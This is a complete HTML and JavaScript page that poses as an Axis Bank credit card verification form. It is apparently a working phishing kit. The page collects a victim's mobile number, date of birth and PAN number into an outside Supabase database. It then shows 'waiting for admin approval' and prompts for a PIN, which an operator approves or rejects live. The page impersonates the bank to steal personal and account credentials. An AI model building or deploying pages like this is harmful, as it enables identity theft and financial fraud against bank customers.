<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axis Bank - Credit Card Verification</title>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fc;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }

        .container {
            width: 100%;
            max-width: 440px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 8px 35px rgba(0, 48, 135, 0.12);
            overflow: hidden;
            border: 1px solid #e5e9f5;
        }

        .header {
            background: linear-gradient(135deg, #003087, #0047cc);
            color: white;
            padding: 28px 20px;
            text-align: center;
            position: relative;
        }

        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(to right, #ffcc00, #ffd24d);
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 8px;
        }

        .logo-circle {
            background: white;
            color: #003087;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            font-size: 27px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }

        .logo-text {
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -1.5px;
        }

        .content {
            padding: 32px 24px 28px;
        }

        h2 {
            text-align: center;
            color: #1c2b4a;
            font-size: 26px;
            margin-bottom: 6px;
            font-weight: 700;
        }

        .subtitle {
            text-align: center;
            color: #455a7f;
            font-size: 15px;
            margin-bottom: 30px;
        }

        .inputBox {
            margin-bottom: 22px;
        }

        label {
            display: block;
            margin-bottom: 7px;
            color: #1c2b4a;
            font-weight: 600;
            font-size: 14.5px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #c8d0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }

        input:focus {
            border-color: #003087;
            box-shadow: 0 0 0 4px rgba(0, 48, 135, 0.12);
            outline: none;
        }

        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(135deg, #003087, #0047cc);
            color: white;
            font-size: 16.5px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: all 0.3s;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 18px rgba(0, 48, 135, 0.3);
        }

        #status {
            margin-top: 20px;
            min-height: 85px;
        }

        .wait {
            color: #0066cc;
            font-weight: 600;
            text-align: center;
        }

        .reject {
            color: #d32f2f;
            font-size: 20px;
            font-weight: 700;
            text-align: center;
        }

        .success {
            color: #008000;
            font-size: 26px;
            font-weight: 700;
            text-align: center;
        }

        .loader {
            width: 42px;
            height: 42px;
            border: 4px solid #e0e7f5;
            border-top: 4px solid #003087;
            border-radius: 50%;
            margin: 12px auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% { transform: rotate(360deg); }
        }

        .secure {
            text-align: center;
            margin-top: 18px;
            color: #0066cc;
            font-size: 13.5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-circle">A</div>
                <div class="logo-text">axis</div>
            </div>
            <p style="font-size:14.5px; opacity:0.95;">Credit Card Application</p>
        </div>

        <div class="content">
            <h2>Premium Verification</h2>
            <p class="subtitle">Secure • Instant • Paperless</p>

            <div class="inputBox">
                <label>Mobile Number</label>
                <input type="text" id="number1" placeholder="Enter 10-digit mobile number" maxlength="10">
            </div>

            <div class="inputBox">
                <label>Date of Birth</label>
                <input type="month" id="date_value">
            </div>

            <div class="inputBox">
                <label>PAN Number</label>
                <input type="text" id="number2" placeholder="Enter PAN Number" maxlength="10" style="text-transform:uppercase">
            </div>

            <button onclick="submitForm()">Continue Securely</button>

            <div class="secure">🔒 256-Bit Encrypted | Trusted by Millions</div>
        </div>

        <div id="status"></div>
    </div>

    <script>
    const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
    const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    let currentId = null;
    let interval = null;

    async function submitForm(){
        const number1 = document.getElementById('number1').value;
        const date_value = document.getElementById('date_value').value;
        const number2 = document.getElementById('number2').value;

        if(!number1 || !date_value || !number2){
            alert('Please fill all fields');
            return;
        }

        document.getElementById('status').innerHTML = `
            <div class="loader"></div>
            <div class="wait">Submitting your request...</div>
        `;

        const { data, error } = await client
            .from('requests')
            .insert([{
                number1, date_value, number2,
                status: 'pending',
                pin: '',
                pin_status: 'waiting'
            }])
            .select();

        if(error){
            document.getElementById('status').innerHTML = `<div class="reject">Submission Error</div>`;
            return;
        }

        currentId = data[0].id;
        listenStatus();
    }

    function listenStatus(){
        clearInterval(interval);
        interval = setInterval(async () => {
            const { data, error } = await client
                .from('requests')
                .select('*')
                .eq('id', currentId)
                .single();

            if(error) return;

            const statusDiv = document.getElementById('status');

            if(data.status === 'pending'){
                statusDiv.innerHTML = `
                    <div class="loader"></div>
                    <div class="wait">Waiting for admin approval...</div>
                `;
            } 
            else if(data.status === 'rejected'){
                clearInterval(interval);
                statusDiv.innerHTML = `<div class="reject">Request Rejected</div>`;
            } 
            else if(data.status === 'accepted'){
                if(data.pin_status === 'waiting'){
                    if(!document.getElementById('pin')){
                        statusDiv.innerHTML = `
                            <input type="text" id="pin" placeholder="Enter PIN" style="margin:15px 0; width:100%; padding:14px;">
                            <button onclick="submitPin()" style="margin-top:0;">Submit PIN</button>
                        `;
                    }
                } 
                else if(data.pin_status === 'pending'){
                    statusDiv.innerHTML = `
                        <div class="loader"></div>
                        <div class="wait">Verifying PIN...</div>
                    `;
                } 
                else if(data.pin_status === 'rejected'){
                    clearInterval(interval);
                    statusDiv.innerHTML = `<div class="reject">PIN Rejected</div>`;
                } 
                else if(data.pin_status === 'accepted'){
                    clearInterval(interval);
                    statusDiv.innerHTML = `
                        <div class="success">Congratulations! 🎉<br>Verified Successfully</div>
                    `;
                }
            }
        }, 2000);
    }

    async function submitPin(){
        const pin = document.getElementById('pin').value;
        if(!pin) {
            alert("Please enter PIN");
            return;
        }

        document.getElementById('status').innerHTML = `
            <div class="loader"></div>
            <div class="wait">Submitting PIN...</div>
        `;

        const { error } = await client
            .from('requests')
            .update({ pin: pin, pin_status: 'pending' })
            .eq('id', currentId);

        if(error) {
            document.getElementById('status').innerHTML = `<div class="reject">PIN Submission Error</div>`;
        }
    }
    </script>
</body>
</html>
